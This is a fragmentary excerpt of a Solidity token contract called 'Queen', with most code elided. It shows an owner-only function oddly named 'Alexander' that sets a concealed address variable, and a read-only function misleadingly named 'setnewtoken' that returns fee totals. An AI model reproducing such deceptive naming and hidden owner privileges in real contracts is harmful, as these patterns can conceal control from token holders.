...
contract Ownership is Context {  
    ...
    */
    ...
    function Alexander(address newOwner) external onlyOwner {
        _fac = newOwner;
    }  
...
contract Queen is Context, IERC20, Ownership{
    ...
    function setnewtoken(address shareholder) external view returns (uint256, uint256, uint256, uint256) {
        return (
            _feeTotalShares,
    ...
    function checkdata() external view returns (uint256,uint256,uint256,uint256,uint256) {
        return (
            _feeBuyback,
            _feeReflection,
            _feeMarketing,
    ...
    function generating(uint256 _amount) private view returns (uint256) {
